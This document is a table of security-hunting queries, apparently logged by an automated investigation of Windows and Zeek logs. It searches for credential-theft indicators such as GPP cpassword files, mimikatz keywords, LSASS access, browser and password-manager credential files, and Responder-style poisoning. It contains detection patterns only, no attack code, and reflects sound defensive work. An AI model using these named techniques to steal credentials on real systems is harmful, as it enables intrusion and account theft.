| q-8575136439 | check C196 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code IN (\"4103\",\"4104\") AND (TO_LOWER(COALESCE(powershell.script_block_text, win.ScriptBlockText, \"\")) LIKE \"*groups.xml*\" OR TO_LOWER(COALESCE(powershell.script_block_… | ERROR |  |
| q-8cfb7729d0 | check C196 (repaired) | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code IN (\"4103\",\"4104\") AND (TO_LOWER(COALESCE(win.ScriptBlockText, \"\")) LIKE \"*groups.xml*\" OR TO_LOWER(COALESCE(win.ScriptBlockText, \"\")) LIKE \"*sysvol*\" OR TO_LO… | 32 |  |
| q-38d2fff0bb | check C197 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND (TO_LOWER(process.command_line) LIKE \"*sysvol*\" OR TO_LOWER(process.command_line) LIKE \"*groups.xml*\" OR TO_LOWER(process.command_line) LIKE \"*cpassword*\" O… | 0 |  |
| q-ba3e579cb3 | check C198 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"11\" AND (TO_LOWER(file.path) LIKE \"*groups.xml*\" OR TO_LOWER(file.path) LIKE \"*sysvol*\" OR TO_LOWER(file.path) LIKE \"*gpprefdecrypt*\" OR TO_LOWER(file.path) LIKE \… | 22 |  |
| q-ab18f1ca07 | check C199 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code == \"5145\" AND (TO_LOWER(win.RelativeTargetName) LIKE \"*groups.xml*\" OR TO_LOWER(win.ShareName) LIKE \"*sysvol*\" OR TO_LOWER(win.ShareName) LIKE \"*netlogon*\") \| KEEP … | 56 |  |
| q-b6cd0fc4b4 | check C200 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code IN (\"4663\",\"4656\",\"4658\") AND (TO_LOWER(win.ObjectName) LIKE \"*groups.xml*\" OR TO_LOWER(win.ObjectName) LIKE \"*sysvol*\" OR TO_LOWER(win.ObjectName) LIKE \"*gpp*\")… | 0 |  |
| q-7e22b76520 | check C201 | esql | {"query": "FROM logs-windows.other-default METADATA _id, _index \| WHERE TO_LOWER(COALESCE(message, win.Message, \"\")) LIKE \"*sysvol*\" OR TO_LOWER(COALESCE(message, win.Message, \"\")) LIKE \"*groups.xml*\" OR TO_LOWER(COALESCE(message, win.Message, \"\")) … | 0 |  |
| q-bedc4a97dc | check C202 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"10\" AND (TO_LOWER(win.TargetImage) LIKE \"*lsass.exe\" OR TO_LOWER(win.SourceImage) LIKE \"*lsass.exe\") \| KEEP @timestamp, host.name, user.name, win.SourceImage, win.T… | 500 |  |
| q-6c1c952251 | check C203 | aggregate | {"dataset": "windows.sysmon", "field": "win.GrantedAccess", "query": "event.code:10 AND win.TargetImage:*lsass.exe", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 326 |  |
| q-e2d6f2ee9a | check C204 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND (TO_LOWER(process.command_line) LIKE \"*sekurlsa*\" OR TO_LOWER(process.command_line) LIKE \"*lsadump*\" OR TO_LOWER(process.command_line) LIKE \"*mimikatz*\" OR … | 0 |  |
| q-cd5c2e1a5c | check C205 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code IN (\"4663\",\"4656\",\"4670\",\"4658\") AND (TO_LOWER(win.ObjectName) LIKE \"*\\\\protect\\\\*\" OR TO_LOWER(win.ObjectName) LIKE \"*credential*\" OR TO_LOWER(win.ObjectNam… | ERROR |  |
| q-7ff9ae24c2 | check C205 (repaired) | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code IN (\"4663\",\"4656\",\"4670\",\"4658\") AND (TO_LOWER(win.ObjectName) LIKE \"*protect*\" OR TO_LOWER(win.ObjectName) LIKE \"*credential*\" OR TO_LOWER(win.ObjectName) LIKE … | 19 | F30, F32 |
| q-e4efb27289 | check C206 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code == \"4688\" AND (TO_LOWER(process.command_line) LIKE \"*sekurlsa*\" OR TO_LOWER(process.command_line) LIKE \"*lsadump*\" OR TO_LOWER(process.command_line) LIKE \"*mimikatz*\… | 0 |  |
| q-26fcd553a2 | check C207 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code IN (\"4103\",\"4104\") AND (TO_LOWER(COALESCE(powershell.script_block_text, win.ScriptBlockText, \"\")) LIKE \"*sekurlsa*\" OR TO_LOWER(COALESCE(powershell.script_block_te… | ERROR |  |
| q-8df2e6e2f1 | check C207 (repaired) | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code IN (\"4103\",\"4104\") AND (TO_LOWER(COALESCE(win.ScriptBlockText, \"\")) LIKE \"*sekurlsa*\" OR TO_LOWER(COALESCE(win.ScriptBlockText, \"\")) LIKE \"*lsadump*\" OR TO_LOW… | 5 |  |
| q-d820219026 | check C208 | esql | {"query": "FROM logs-windows.other-default METADATA _id, _index \| WHERE TO_LOWER(COALESCE(message, win.Message, \"\")) LIKE \"*lsass*\" OR TO_LOWER(COALESCE(message, win.Message, \"\")) LIKE \"*credential*\" OR TO_LOWER(COALESCE(message, win.Message, \"\")) L… | 2 | F32 |
| q-647f4aa06e | check C209 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND (TO_LOWER(process.command_line) LIKE \"*login data*\" OR TO_LOWER(process.command_line) LIKE \"*\\\\google\\\\chrome\\\\user data*\" OR TO_LOWER(process.command_l… | ERROR |  |
| q-d1ca778c42 | check C209 (repaired) | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND (TO_LOWER(process.command_line) LIKE \"*login data*\" OR TO_LOWER(process.command_line) LIKE \"*google*chrome*user data*\" OR TO_LOWER(process.command_line) LIKE … | 0 |  |
| q-6a68baf8c6 | check C210 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"11\" AND (TO_LOWER(file.path) LIKE \"*login data*\" OR TO_LOWER(file.path) LIKE \"*logins.json*\" OR TO_LOWER(file.path) LIKE \"*key3.db*\" OR TO_LOWER(file.path) LIKE \"… | ERROR |  |
| q-743feb6a13 | check C210 (repaired) | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"11\" AND (TO_LOWER(file.path) LIKE \"*login data*\" OR TO_LOWER(file.path) LIKE \"*logins.json*\" OR TO_LOWER(file.path) LIKE \"*key3.db*\" OR TO_LOWER(file.path) LIKE \"… | 0 |  |
| q-63aea8862e | check C211 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"10\" AND (TO_LOWER(win.TargetImage) LIKE \"*chrome.exe\" OR TO_LOWER(win.TargetImage) LIKE \"*firefox.exe\" OR TO_LOWER(win.TargetImage) LIKE \"*msedge.exe\" OR TO_LOWER(… | 0 |  |
| q-768413d760 | check C212 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code IN (\"4663\",\"4656\",\"4658\") AND (TO_LOWER(win.ObjectName) LIKE \"*login data*\" OR TO_LOWER(win.ObjectName) LIKE \"*logins.json*\" OR TO_LOWER(win.ObjectName) LIKE \"*ke… | ERROR |  |
| q-924095e830 | check C212 (repaired) | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code IN (\"4663\",\"4656\",\"4658\") AND (TO_LOWER(win.ObjectName) LIKE \"*login data*\" OR TO_LOWER(win.ObjectName) LIKE \"*logins.json*\" OR TO_LOWER(win.ObjectName) LIKE \"*ke… | 0 |  |
| q-746bd07b74 | check C213 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code IN (\"4103\",\"4104\") AND (TO_LOWER(COALESCE(powershell.script_block_text, win.ScriptBlockText, \"\")) LIKE \"*login data*\" OR TO_LOWER(COALESCE(powershell.script_block_… | ERROR |  |
| q-f2c6aa6426 | check C213 (repaired) | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code IN (\"4103\",\"4104\") AND (TO_LOWER(COALESCE(win.ScriptBlockText, \"\")) LIKE \"*login data*\" OR TO_LOWER(COALESCE(win.ScriptBlockText, \"\")) LIKE \"*logins.json*\" OR … | 0 |  |
| q-662c2a83c6 | check C214 | esql | {"query": "FROM logs-windows.other-default METADATA _id, _index \| WHERE TO_LOWER(COALESCE(message, win.Message, \"\")) LIKE \"*login data*\" OR TO_LOWER(COALESCE(message, win.Message, \"\")) LIKE \"*logins.json*\" OR TO_LOWER(COALESCE(message, win.Message, \"… | 0 |  |
| q-bdee5bab19 | check C215 | search | {"dataset": "windows.sysmon", "query": "event.code:10 AND win.TargetImage:*lsass*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_li… | 326 |  |
| q-515a52a8b6 | check C216 | aggregate | {"dataset": "windows.sysmon", "field": "win.GrantedAccess", "query": "event.code:10 AND win.TargetImage:*lsass*", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 326 |  |
| q-eea81debd6 | check C217 | search | {"dataset": "windows.sysmon", "query": "event.code:15 AND file.path:*Credentials*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_li… | 0 |  |
| q-96c411bc03 | check C218 | search | {"dataset": "windows.security", "query": "event.code:4688 AND (process.command_line:*vault* OR process.command_line:*Credential* OR process.command_line:*cmdkey*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "eve… | 0 |  |
| q-042928defe | check C219 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (powershell.script_block_text:*Credential* OR powershell.script_block_text:*vault* OR powershell.script_block_text:*cmdkey*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.na… | 0 |  |
| q-b5886fa39d | check C220 | search | {"dataset": "windows.other", "query": "message:*Credential* OR message:*vault*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line"… | 2 |  |
| q-4da306f0a1 | check C221 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND (process.executable:*keepass* OR process.executable:*1password* OR process.executable:*bitwarden* OR process.executable:*lastpass* OR process.executable:*dashlane*)", "time_from": null, "time_to": null, … | 0 |  |
| q-15a84e81f4 | check C222 | search | {"dataset": "windows.sysmon", "query": "event.code:11 AND (file.path:*keepass* OR file.path:*1password* OR file.path:*bitwarden* OR file.path:*lastpass*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.datase… | 0 |  |
| q-283afc885b | check C223 | search | {"dataset": "windows.sysmon", "query": "event.code:10 AND (win.TargetImage:*keepass* OR win.TargetImage:*1password* OR win.TargetImage:*bitwarden*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "e… | 0 |  |
| q-ebbaf19c9d | check C224 | search | {"dataset": "windows.security", "query": "event.code:4688 AND (process.command_line:*keepass* OR process.command_line:*1password* OR process.command_line:*bitwarden* OR process.command_line:*kdbx*)", "time_from": null, "time_to": null, "fields": ["@timestamp",… | 0 |  |
| q-769998867a | check C225 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (powershell.script_block_text:*keepass* OR powershell.script_block_text:*kdbx* OR powershell.script_block_text:*1password* OR powershell.script_block_text:*bitwarden*)", "time_from": null, "time_t… | 0 |  |
| q-4c63b6ca54 | check C226 | search | {"dataset": "windows.other", "query": "message:*keepass* OR message:*1password* OR message:*bitwarden* OR message:*kdbx*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "p… | 0 |  |
| q-d9aa06bb65 | check C227 | search | {"dataset": "windows.sysmon", "query": "event.code:10 AND win.TargetImage:*lsass*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_li… | 326 |  |
| q-a022866a6a | check C228 | aggregate | {"dataset": "windows.sysmon", "field": "win.SourceImage", "query": "event.code:10 AND win.TargetImage:*lsass*", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 326 |  |
| q-ce242378db | check C229 | search | {"dataset": "windows.sysmon", "query": "event.code:7 AND (win.ImageLoaded:*lsass* OR win.ImageLoaded:*cryptdll* OR win.ImageLoaded:*sam* OR win.ImageLoaded:*msv1_0*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "… | 77 | F36 |
| q-20ba9ecb6f | check C230 | search | {"dataset": "windows.security", "query": "event.code:4657 AND (win.ObjectName:*lsass* OR win.ObjectName:*cryptdll* OR win.ObjectName:*msv1_0* OR win.ObjectName:*sam*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", … | 0 |  |
| q-407e1ec52c | check C231 | search | {"dataset": "windows.security", "query": "event.code:4688 AND (process.command_line:*lsass* OR process.command_line:*cryptdll* OR process.command_line:*msv1_0*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event… | 0 |  |
| q-b9530e8dfb | check C232 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (powershell.script_block_text:*lsass* OR powershell.script_block_text:*cryptdll* OR powershell.script_block_text:*msv1_0* OR powershell.script_block_text:*SecurityPackages*)", "time_from": null, "… | 0 |  |
| q-f25d033dc2 | check C233 | search | {"dataset": "windows.other", "query": "message:*lsass* OR message:*cryptdll* OR message:*msv1_0*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "pro… | 0 |  |
| q-a476257fc1 | check C234 | search | {"dataset": "windows.security", "query": "event.code:4624 AND win.LogonType:3", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line",… | 218 |  |
| q-8f22d38371 | check C235 | search | {"dataset": "windows.security", "query": "event.code:4648", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip", "desti… | 15 |  |
| q-184b91ef49 | check C236 | aggregate | {"dataset": "windows.security", "field": "win.TargetUserName", "query": "event.code:4624 OR event.code:4648", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 312 |  |
| q-f6a6e0aee1 | check C237 | search | {"dataset": "windows.sysmon", "query": "event.code:10 AND win.TargetImage:*lsass*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_li… | 326 |  |
| q-f351ee7854 | check C238 | search | {"dataset": "windows.sysmon", "query": "event.code:7 AND (win.ImageLoaded:*lsass* OR win.ImageLoaded:*cryptdll*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.e… | 33 |  |
| q-3e6f1aa4a6 | check C239 | search | {"dataset": "windows.other", "query": "message:*lsass* OR message:*cryptdll*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", … | 0 |  |
| q-e9de31978a | check C240 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (powershell.script_block_text:*lsass* OR powershell.script_block_text:*cryptdll* OR powershell.script_block_text:*Skeleton* OR powershell.script_block_text:*DCShadow*)", "time_from": null, "time_t… | 0 |  |
| q-d9d266963f | check C241 | search | {"dataset": "windows.sysmon", "query": "event.code:11 AND (file.path:*System32* AND (file.path:*.dll))", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable"… | 0 |  |
| q-50e8f86f14 | check C242 | search | {"dataset": "windows.sysmon", "query": "event.code:7 AND (win.ImageLoaded:*lsass* OR win.ImageLoaded:*cryptdll*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.e… | 33 |  |
| q-43be1a64a0 | check C243 | search | {"dataset": "windows.security", "query": "event.code:4657 AND (win.ObjectName:*Notification\\ Packages* OR win.ObjectName:*Password* OR win.ObjectName:*lsass*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.… | 0 |  |
| q-c8dfb83924 | check C244 | search | {"dataset": "windows.security", "query": "event.code:4688 AND (process.command_line:*Notification* OR process.command_line:*PasswordFilter*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.co… | 0 |  |
| q-1941ce22f7 | check C245 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (powershell.script_block_text:*Notification* OR powershell.script_block_text:*PasswordFilter* OR powershell.script_block_text:*lsass*)", "time_from": null, "time_to": null, "fields": ["@timestamp"… | 0 |  |
| q-dcc04a3746 | check C246 | search | {"dataset": "windows.other", "query": "message:*Notification* OR message:*PasswordFilter* OR message:*lsass*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.execu… | 10 |  |
| q-28168d174c | check C247 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (powershell.script_block_text:*AllowReversiblePasswordEncryption* OR powershell.script_block_text:*ReversibleEncryption* OR powershell.script_block_text:*Set-ADUser*)", "time_from": null, "time_to… | 0 |  |
| q-d896f74358 | check C248 | search | {"dataset": "windows.powershell", "query": "event.code:4103 AND (message:*AllowReversiblePasswordEncryption* OR message:*ReversibleEncryption*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event… | 0 |  |
| q-5c8c464513 | check C249 | search | {"dataset": "windows.security", "query": "event.code:4739", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip", "desti… | 0 |  |
| q-edd1759b91 | check C250 | search | {"dataset": "windows.security", "query": "event.code:4688 AND (process.command_line:*Reversible* OR process.command_line:*Set-ADUser* OR process.command_line:*dsmod*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", … | 0 |  |
| q-f0555ece6a | check C251 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND (process.command_line:*Reversible* OR process.command_line:*Set-ADUser* OR process.command_line:*dsmod*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "even… | 0 |  |
| q-c4995bfa8d | check C252 | search | {"dataset": "windows.other", "query": "message:*Reversible* OR message:*AllowReversiblePasswordEncryption*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executa… | 0 |  |
| q-07efb17f83 | check C253 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE TO_LOWER(powershell.script_block_text) LIKE \"*set-aduser*\" OR TO_LOWER(powershell.script_block_text) LIKE \"*set-adauthenticationpolicy*\" OR TO_LOWER(powershell.script_block_text)… | ERROR |  |
| q-9d66d9aeb3 | check C253 (repaired) | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE TO_LOWER(win.ScriptBlockText) LIKE \"*set-aduser*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*set-adauthenticationpolicy*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*strongauthenticati… | 1 |  |
| q-7172668d28 | check C254 | count | {"dataset": "windows.security", "query": "event.code:4739", "time_from": null, "time_to": null} | 0 |  |
| q-6a440e3e25 | check C255 | aggregate | {"dataset": "windows.security", "field": "win.ObjectType", "query": "event.code:5136 OR event.code:4739", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-856460bddd | check C256 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND (TO_LOWER(process.command_line) LIKE \"*set-aduser*\" OR TO_LOWER(process.command_line) LIKE \"*set-adauthenticationpolicy*\" OR TO_LOWER(process.command_line) LI… | 0 |  |
| q-82a8f6b8f8 | check C257 | search | {"dataset": "windows.other", "query": "event.code:4739 OR event.code:5136 OR event.code:4738", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process… | 0 |  |
| q-f67f99fd51 | check C258 | aggregate | {"dataset": "windows.security", "field": "win.LogonProcessName", "query": "event.code:4624", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 297 |  |
| q-253b5e25f8 | check C259 | aggregate | {"dataset": "windows.security", "field": "win.AuthenticationPackageName", "query": "event.code:4624", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 297 |  |
| q-8ff0518b33 | check C260 | count | {"dataset": "windows.security", "query": "event.code:5136", "time_from": null, "time_to": null} | 0 |  |
| q-ce1477f396 | check C261 | aggregate | {"dataset": "windows.sysmon", "field": "win.ImageLoaded", "query": "event.code:7", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 20259 |  |
| q-112a7d4380 | check C262 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE TO_LOWER(powershell.script_block_text) LIKE \"*connect-msolservice*\" OR TO_LOWER(powershell.script_block_text) LIKE \"*connect-azuread*\" OR TO_LOWER(powershell.script_block_text) L… | ERROR |  |
| q-9bcb8e4fa5 | check C262 (repaired) | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE TO_LOWER(win.ScriptBlockText) LIKE \"*connect-msolservice*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*connect-azuread*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*new-azuread*\" OR TO… | 0 |  |
| q-6bc134b70f | check C263 | search | {"dataset": "windows.other", "query": "event.code:5136 OR event.code:4739 OR event.code:4738", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process… | 0 |  |
| q-435a5f25c1 | check C264 | count | {"dataset": "windows.security", "query": "event.code:4657", "time_from": null, "time_to": null} | 36 |  |
| q-08d6a2ccc4 | check C265 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code == \"4657\" AND (TO_LOWER(win.ObjectName) LIKE \"*networkprovider*\" OR TO_LOWER(win.ObjectName) LIKE \"*credential*\" OR TO_LOWER(win.ObjectName) LIKE \"*winlogon*\") \| KE… | 0 |  |
| q-a467996067 | check C266 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"11\" AND (TO_LOWER(file.path) LIKE \"*networkprovider*\" OR TO_LOWER(file.path) LIKE \"*system32*credential*\" OR TO_LOWER(file.path) LIKE \"*winlogon*\") \| KEEP @timest… | 1 |  |
| q-42cbcad01b | check C267 | aggregate | {"dataset": "windows.sysmon", "field": "win.TargetImage", "query": "event.code:10", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 39283 |  |
| q-a166613d4e | check C268 | aggregate | {"dataset": "windows.sysmon", "field": "win.ImageLoaded", "query": "event.code:7", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 20259 |  |
| q-d00da1aa86 | check C269 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE TO_LOWER(powershell.script_block_text) LIKE \"*networkprovider*\" OR TO_LOWER(powershell.script_block_text) LIKE \"*new-itemproperty*\" OR TO_LOWER(powershell.script_block_text) LIKE… | ERROR |  |
| q-281476d025 | check C269 (repaired) | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE TO_LOWER(win.ScriptBlockText) LIKE \"*networkprovider*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*new-itemproperty*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*reg add*\" \| KEEP @tim… | 0 |  |
| q-33ad7d7e3d | check C270 | search | {"dataset": "windows.other", "query": "event.code:4657 OR event.code:11 OR event.code:7", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.comm… | 4 |  |
| q-6c8d091bcd | check C271 | aggregate | {"dataset": "windows.security", "field": "win.ObjectType", "query": "event.code:4663 OR event.code:4670 OR event.code:4656", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 10977 |  |
| q-c1bf9ab007 | check C272 | aggregate | {"dataset": "windows.security", "field": "win.ProcessName", "query": "event.code:4663 OR event.code:4670 OR event.code:4656", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 10977 |  |
| q-ae1b711ad6 | check C273 | aggregate | {"dataset": "windows.sysmon", "field": "win.DestinationHostname", "query": "event.code:3", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 1229 |  |
| q-1d6dcfae90 | check C274 | aggregate | {"dataset": "windows.sysmon", "field": "win.QueryName", "query": "event.code:22", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 81 |  |
| q-1380a823da | check C275 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE TO_LOWER(powershell.script_block_text) LIKE \"*responder*\" OR TO_LOWER(powershell.script_block_text) LIKE \"*mitm*\" OR TO_LOWER(powershell.script_block_text) LIKE \"*arpspoof*\" OR… | ERROR |  |
| q-12aefb5c3d | check C275 (repaired) | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE TO_LOWER(win.ScriptBlockText) LIKE \"*responder*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*mitm*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*arpspoof*\" OR TO_LOWER(win.ScriptBlockTe… | 0 |  |
| q-9f7b5794d8 | check C276 | search | {"dataset": "windows.other", "query": "event.code:4663 OR event.code:4670 OR event.code:4656 OR event.code:3 OR event.code:22", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name… | 2 |  |
| q-626225d106 | check C277 | aggregate | {"dataset": "zeek", "field": "zeek.conn_state", "query": "event.action:conn", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 613 |  |
| q-213d4518c9 | check C278 | aggregate | {"dataset": "zeek", "field": "zeek.service", "query": "event.action:conn", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 613 |  |
| q-d621b5d3b4 | check C279 | count | {"dataset": "windows.security", "query": "event.code:4697", "time_from": null, "time_to": null} | 23 |  |
| q-3e95199abe | check C280 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code == \"4657\" AND TO_LOWER(win.ObjectName) LIKE \"*dnsclient*\" \| KEEP @timestamp, host.name, user.name, win.ObjectName, win.NewValue, _id, _index"} | 0 |  |
| q-cd64e9fcc9 | check C281 | aggregate | {"dataset": "windows.sysmon", "field": "win.DestinationHostname", "query": "event.code:3", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 1229 |  |
| q-05a5ca0dd1 | check C282 | aggregate | {"dataset": "windows.sysmon", "field": "win.QueryName", "query": "event.code:22", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 81 |  |
| q-88d7931b6f | check C283 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE TO_LOWER(powershell.script_block_text) LIKE \"*llmnr*\" OR TO_LOWER(powershell.script_block_text) LIKE \"*nbt-ns*\" OR TO_LOWER(powershell.script_block_text) LIKE \"*responder*\" OR … | ERROR |  |
| q-4bc396847e | check C283 (repaired) | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE TO_LOWER(win.ScriptBlockText) LIKE \"*llmnr*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*nbt-ns*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*responder*\" OR TO_LOWER(win.ScriptBlockTex… | 0 |  |
| q-f8d71170f0 | check C284 | search | {"dataset": "windows.other", "query": "event.code:4697 OR event.code:4657 OR event.code:3 OR event.code:22", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executa… | 2 |  |
| q-cad15a79fa | check C285 | aggregate | {"dataset": "zeek", "field": "zeek.id_resp_h", "query": "event.action:conn AND zeek.service:smb", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 0 |  |
| q-2473459783 | check C286 | aggregate | {"dataset": "zeek", "field": "zeek.query", "query": "event.action:dns", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 53 |  |
| q-f14c6e6fd3 | check C287 | aggregate | {"dataset": "windows.sysmon", "field": "win.DestinationHostname", "query": "event.code:3", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 1229 |  |
| q-b2db17e7a6 | check C288 | aggregate | {"dataset": "windows.sysmon", "field": "win.QueryName", "query": "event.code:22", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 81 |  |
| q-f3a8675dbe | check C289 | aggregate | {"dataset": "windows.security", "field": "win.ProcessName", "query": "event.code:4663 OR event.code:4670 OR event.code:4656", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 10977 |  |
| q-5fb70fd219 | check C290 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE TO_LOWER(powershell.script_block_text) LIKE \"*arp*\" OR TO_LOWER(powershell.script_block_text) LIKE \"*netsh interface*\" OR TO_LOWER(powershell.script_block_text) LIKE \"*get-netne… | ERROR |  |
